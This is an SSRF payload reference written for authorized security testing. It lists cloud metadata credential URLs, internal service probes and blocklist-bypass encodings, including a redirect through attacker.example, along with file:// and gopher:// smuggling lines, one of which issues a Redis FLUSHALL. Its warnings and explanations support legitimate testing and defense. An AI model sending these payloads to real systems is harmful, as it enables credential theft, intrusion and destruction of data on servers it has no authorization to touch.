# Server-Side Request Forgery (SSRF) Payload Reference

## Table of Contents

- [Purpose](#purpose)
- [Cloud Metadata Endpoints](#cloud-metadata-endpoints)
- [Internal Network Probing](#internal-network-probing)
- [Blocklist Bypass Techniques](#blocklist-bypass-techniques)
- [Protocol Smuggling](#protocol-smuggling)
- [Blind SSRF Detection](#blind-ssrf-detection)
- [References](#references)

## Purpose

This collection targets features that perform a server-side HTTP(S) request based on user input — URL preview generators, webhook testers, PDF/image import-from-URL features, and third-party integration callbacks. Each entry explains the underlying condition it detects, not just the raw request to send.

## Cloud Metadata Endpoints

**Purpose**: extract temporary cloud credentials or instance metadata when the vulnerable server runs on cloud infrastructure.

**AWS (IMDSv1 — no token required):**
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
```

**AWS (IMDSv2 — requires a session token, so pure GET-based SSRF alone is often insufficient):**
```
PUT http://169.254.169.254/latest/api/token
Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
```
> If the SSRF only controls the URL and not headers/method, IMDSv2-enforced instances are generally not exploitable via this vector alone — note this explicitly in a report rather than claiming full impact.

**GCP:**
```
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
Header required: Metadata-Flavor: Google
```

**Azure:**
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
Header required: Metadata: true
```

**Usage**: submit as the target URL in any server-side-fetch feature. Header-requiring variants (GCP, Azure) only work if the SSRF vector allows custom header injection into the forged request — many URL-preview features do not, which limits impact and should be noted accurately.

**Detection**: a full-response SSRF returns metadata content (JSON/plaintext role names, tokens) directly in the application's response. A blind SSRF requires an out-of-band listener instead (see below).

**Expected Behaviour**: vulnerable targets return metadata service content. Non-vulnerable targets either reject the internal IP range outright, or the request fails because IMDSv2 enforcement blocks header-less requests.

## Internal Network Probing

**Purpose**: enumerate internal services reachable from the vulnerable server, once basic SSRF is confirmed.

```
http://127.0.0.1:PORT/
http://localhost:PORT/
http://10.0.0.0/8 range sweep (only within authorized, non-destructive testing bounds)
http://internal-service-name/  (if internal DNS is guessable from context, e.g., "redis", "elasticsearch", "internal-api")
```

**Usage**: iterate common internal ports (`6379` Redis, `9200` Elasticsearch, `8080`/`8443` common internal web UIs, `27017` MongoDB) against `127.0.0.1` and any internal hostnames discovered via error messages or DNS.

**Detection**: differing response times, status codes, or error messages between closed and open/listening ports confirm reachability even without full response disclosure.

**Expected Behaviour**: an open, unauthenticated internal service returns its normal banner/response. A closed port typically returns a connection-refused-style error distinguishable from a generic "invalid host" application error.

> **Warning**
> Internal network probing can trigger alerting on internal security monitoring and, if not carefully scoped, resemble an active internal compromise to a defensive team. Keep probing to the minimum needed to demonstrate impact and stop once reachability is confirmed — do not attempt to interact further with discovered internal services beyond what's needed for the report.

## Blocklist Bypass Techniques

| Technique | Example | Why It Works |
|---|---|---|
| Decimal IP encoding | `http://2130706433/` (= 127.0.0.1) | Blocklist regex matches dotted-quad notation only |
| Octal IP encoding | `http://0177.0.0.1/` | Same reasoning — string-based blocklists rarely parse alternate numeric encodings |
| IPv6-mapped IPv4 | `http://[::ffff:127.0.0.1]/` | Blocklist checks IPv4 patterns only, misses IPv6 syntax carrying the same address |
| DNS rebinding | Attacker-controlled domain resolves to a public IP at validation time, then to `127.0.0.1` at request time | Validation and actual request happen at different times against different DNS answers |
| Open redirect chaining | `http://attacker.example/redirect?to=http://169.254.169.254/` where the target follows redirects | Initial URL passes the allow-list check; the redirect destination is never re-validated |
| URL parser inconsistency | `http://169.254.169.254%2f@attacker.example/` | Different components of the stack (validator vs. actual HTTP client) parse the URL differently, disagreeing on the effective host |

## Protocol Smuggling

**Purpose**: where the underlying HTTP client library supports additional URL schemes beyond `http(s)://`, these can sometimes be leveraged for broader impact.

```
file:///etc/passwd
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A
dict://127.0.0.1:11211/stats
```

**Usage**: only applicable if the fetching library does not restrict allowed schemes. `gopher://` in particular allows constructing raw byte sequences against non-HTTP internal services (e.g., issuing Redis commands) but requires careful payload construction specific to the target protocol.

**Detection**: `file://` success is directly visible in the response body. `gopher://`-based protocol smuggling against services like Redis is best confirmed via an observable side effect you control (e.g., a key you set and then read back), not a destructive command.

> **Warning**
> Do not use protocol smuggling to issue destructive or state-changing commands (e.g., Redis `FLUSHALL`, `CONFIG SET`) against a live target. Demonstrate the capability with a read-only or self-contained reversible action, and describe the theoretical destructive capability in the report's Impact section instead of executing it.

## Blind SSRF Detection

**Purpose**: confirm SSRF exists even when no response content is returned to the attacker.

```
http://<unique-subdomain>.oob-listener.example/
```

**Usage**: use a unique, single-use subdomain per test (via Burp Collaborator, `interactsh`, or a self-hosted equivalent) as the target URL, then check the listener for an inbound DNS/HTTP interaction.

**Detection**: an inbound interaction logged against your unique subdomain, correlated by timestamp to the triggering request, is definitive proof the server-side fetch occurred — even with zero response content returned to you.

**Expected Behaviour**: vulnerable targets generate a DNS lookup at minimum, and often a full HTTP request, against your listener. Non-vulnerable targets (properly validating the destination) generate no interaction at all.

## References

- OWASP SSRF Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
- PortSwigger SSRF Cheat Sheet: https://portswigger.net/web-security/ssrf
- AWS IMDSv2 documentation: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html
- `interactsh` (out-of-band interaction tool): https://github.com/projectdiscovery/interactsh
